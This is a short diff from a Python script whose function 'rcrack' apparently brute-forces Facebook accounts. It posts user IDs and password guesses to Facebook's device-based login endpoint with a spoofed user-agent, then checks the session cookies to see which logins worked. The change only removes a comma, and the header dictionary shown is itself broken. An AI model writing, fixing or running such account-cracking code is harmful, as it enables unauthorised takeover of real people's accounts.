@@ -250,7 +250,7 @@ def rcrack(uid,pwx,tl):
 			"login":"Log In"}
 			header_freefb = {
 			'authority':
-			'user-agent': pro,}
+			'user-agent': pro}
 			lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
